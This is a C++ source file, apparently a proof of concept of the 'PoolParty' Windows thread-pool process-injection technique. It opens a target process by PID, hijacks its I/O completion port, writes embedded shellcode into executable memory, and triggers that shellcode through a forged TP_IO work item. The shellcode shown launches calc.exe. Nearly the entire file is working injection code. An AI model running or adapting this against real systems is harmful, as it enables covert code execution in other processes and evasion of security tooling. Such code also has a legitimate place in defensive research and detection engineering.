#include <Windows.h>
#include <iostream>
#include <vector>
#include <winternl.h>

#include "ThreadPool.h"
#include "WorkerFactory.h"
#include "Native.h"

#pragma comment(lib, "ntdll")

EXTERN_C
NTSTATUS NTAPI ZwSetInformationFile(
	_In_ HANDLE hFile,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ ULONG FileInformationClass
);

unsigned char g_Shellcode[] =
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";

int main(int argc, char* argv[])
{
	HANDLE hTargetProcess = nullptr;
	HANDLE hTpWorkFactory = nullptr;
	DWORD TargetPID = 0;

	TargetPID = atoi(argv[1]);
	//TargetPID = 1111;

	hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
	if (hTargetProcess == INVALID_HANDLE_VALUE) {
		printf("[-] OpenProcess failed: 0x%08X\n", GetLastError());
		return 1;
	}

	printf("[+] Opened a remote handle to the target process %d: 0x%p\n", TargetPID, hTargetProcess);

	// Duplicate I/O completion handle from the targer process

	ULONG InformationLength = 0;
	auto status = 0x0;
	std::vector<BYTE> Information;

	do {
		Information.resize(InformationLength);
		status = NtQueryInformationProcess(hTargetProcess, (PROCESSINFOCLASS)51, Information.data(), InformationLength, &InformationLength);
	} while (status == 0xffffffffc0000004);

	if (status != 0x0) {
		printf("[-] NtQueryInformationProcess failed.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	const auto pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information.data());

	HANDLE hDuplicatedObject = INVALID_HANDLE_VALUE;
	std::vector<BYTE> pObjectInformation;
	PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

	for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {

		BOOL bResult = DuplicateHandle(hTargetProcess, pProcessHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObject, IO_COMPLETION_ALL_ACCESS, FALSE, NULL);

		if (bResult == 0x0) {
			printf("[-] DuplicateHandle failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		ULONG InformationLen = 0;
		do {

			pObjectInformation.resize(InformationLen);
			status = NtQueryObject(hDuplicatedObject, (OBJECT_INFORMATION_CLASS)2, pObjectInformation.data(), InformationLen, &InformationLen);

		} while (status == 0xffffffffc0000004);

		if (status != 0x0) {
			printf("[-] NtQueryObject failed.\n");
			CloseHandle(hTargetProcess);
			return 1;
		}

		pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

		printf("\t\t%ls - 0x%p\n", (wchar_t*)pObjectTypeInformation->TypeName.Buffer, hDuplicatedObject);

		if (wcscmp(L"IoCompletion", pObjectTypeInformation->TypeName.Buffer) == 0) {
			printf("[+] Duplicated a I/O completion handle handle: 0x%p\n", hDuplicatedObject);
			break;
		}

		continue;
	}

	if (hDuplicatedObject == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to duplicate I/O completion handle.\n");
		CloseHandle(hTargetProcess);
		return 1;
	}

	// 03 - Allocate shellcode memory in the targer process

	PVOID ShellCodeAddress = nullptr;
	ShellCodeAddress = VirtualAllocEx(hTargetProcess, nullptr, sizeof(g_Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ShellCodeAddress == nullptr) {
		printf("[-] VritualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Allocated shellcode memory to the target process: 0x%p\n", ShellCodeAddress);

	// 04 - Write shellcode in the targer process

	BOOL bResult = WriteProcessMemory(hTargetProcess, ShellCodeAddress, g_Shellcode, sizeof(g_Shellcode), nullptr);

	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Written shellcode to the target process.\n");

	// 05 - Create pool party file "PoolParty.txt"

	HANDLE hFile = CreateFile(L"PoolParty.txt", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFile failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	// 06 - create TP_IO structure associated with the shellcode

	PFULL_TP_IO pTpIo = (PFULL_TP_IO)CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)ShellCodeAddress, nullptr, nullptr);
	if (pTpIo == NULL) {
		printf("[-] CreateThreadpoolIo failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	pTpIo->CleanupGroupMember.Callback = ShellCodeAddress;

	// 07 - start async I/O operation within the TP_IO

	++pTpIo->PendingIrpCount;

	// 08 - Allocate TP_IO memory in the targer process

	PFULL_TP_IO pRemoteTpIo = (PFULL_TP_IO)VirtualAllocEx(hTargetProcess, nullptr, sizeof(FULL_TP_IO), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteTpIo == nullptr) {
		printf("[-] VirtualAllocEx failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	// 09 - write TP_IO into the allocated memory

	bResult = WriteProcessMemory(hTargetProcess, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), nullptr);
	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	// 10 - Associate new file with the IO completion port of the targer process worker factory

	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	FILE_COMPLETION_INFORMATION FileIoCompletionInformation = { 0 };
	FileIoCompletionInformation.Port = hDuplicatedObject;
	FileIoCompletionInformation.Key = &pRemoteTpIo->Direct;

	status = ZwSetInformationFile(hFile, &IoStatusBlock, &FileIoCompletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
	if (status != 0x0) {
		printf("[-] ZwSetInformationFile failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	const std::string Buffer = "Hello there!";
	const auto BufferLength = Buffer.length();
	OVERLAPPED Overlapped = { 0 };
	bResult = WriteFile(hFile, Buffer.c_str(), BufferLength, nullptr, &Overlapped);
	if (bResult == 0x0) {
		printf("[-] WriteFile failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}

	printf("[+] Done!\n");
	CloseHandle(hTargetProcess);
	CloseHandle(hDuplicatedObject);
	return 0;
}
